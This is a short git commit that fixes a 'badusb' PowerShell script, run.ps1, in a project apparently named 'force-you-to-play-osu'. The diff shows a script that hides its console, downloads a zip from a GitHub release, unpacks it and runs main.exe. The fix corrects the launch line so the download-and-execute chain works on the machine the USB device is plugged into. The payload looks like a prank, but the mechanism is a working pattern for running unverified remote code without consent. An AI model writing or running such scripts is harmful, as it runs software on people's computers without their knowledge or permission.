62fa974cf1f7feecb1d298509fab38b9c973c0c6
shift.0x7d8 <zixuan.zhao@ms.zzny.fun>
2025-04-01 14:28:15 -0400

    fix: badusb script

--- run.ps1
+++ run.ps1
@@ -14,4 +14,4 @@ $console = [Console.Window]::GetConsoleWindow()
 Invoke-WebRequest "https://github.com/zznyjidi/force-you-to-play-osu/releases/download/release-v1/main.zip" -OutFile main.zip
 Expand-Archive main.zip
 cd main
-main.exe
+.\main.exe
